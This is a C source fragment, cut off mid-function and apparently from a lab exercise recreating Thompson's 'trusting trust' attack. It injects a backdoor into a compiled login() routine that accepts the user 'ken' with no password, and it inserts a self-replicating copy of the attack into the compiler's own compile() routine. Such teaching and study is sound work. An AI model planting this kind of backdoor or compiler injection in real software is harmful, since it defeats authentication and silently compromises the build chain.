fprintf(fp, "%s", program);
fclose(fp);
/*****************************************************************
     * Step 1:
     */
 
    // match on the start of the login() routine:
    static char login_sig[] = "int login(char *user) {";

    // and inject an attack for "ken":
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
    
    char buffer[100] = {};
    char entire[1000000] = {};
    FILE *fp_read = fopen("./temp-out.c", "r");

    while (fgets(buffer, 100, fp_read)) {
        strcat(entire, buffer);
        if (strstr(buffer, login_sig)) {
            strcat(entire, login_attack);
            strcat(entire, "\n");
        } 
    }

    FILE *fp_w = fopen("./temp-out.c", "w");
    fprintf(fp_w, "%s", entire);
    fclose(fp_w);
    fclose(fp_read);




    /*****************************************************************
     * Step 2:
     */

    // search for the start of the compile routine: 
    // static char compile_sig[] =
    //         "static void compile(char *program, char *outname) {\n"
    //         "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
    //         "    assert(fp);"
    //         ;

    static char compile_first[] =
            "static void compile(char *program, char *outname) {\n"
            ;

    // and inject a placeholder "attack":
    // inject this after the assert above after the call to fopen.
    // not much of an attack.   this is just a quick placeholder.
    // static char compile_attack[] 
    //           = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";

    char line[1000] = {};
    
    char compile_full[1000000] = {};
    FILE *fp_in = fopen("./temp-out.c", "r");

    
    while (fgets(line, 1000, fp_in)) {
        strcat(compile_full, line);

        if (strstr(line, compile_first)) {
            fgets(line, 1000, fp_in);
            strcat(compile_full, line);
            fgets(line, 1000, fp_in);
            strcat(compile_full, line);
            
            strcat(compile_full, prog);

        } 

    }

    FILE *fp_out = fopen("./temp-out.c", "w");
    // fprintf(fp_out, "%s", compile_full);
   

    fprintf(fp_out, "%s", "char prog[] = {\n");
	for(int i = 0; prog[i]; i++) {
		fprintf(fp_out, "\t%d,%c", prog[i], (i+1)%8==0 ? '\n' : ' ');
    }
	fprintf(fp_out, "%s", "0 };\n");
    fprintf(fp_out, "%s", compile_full);

    fclose(fp_out);
    fclose(fp_in);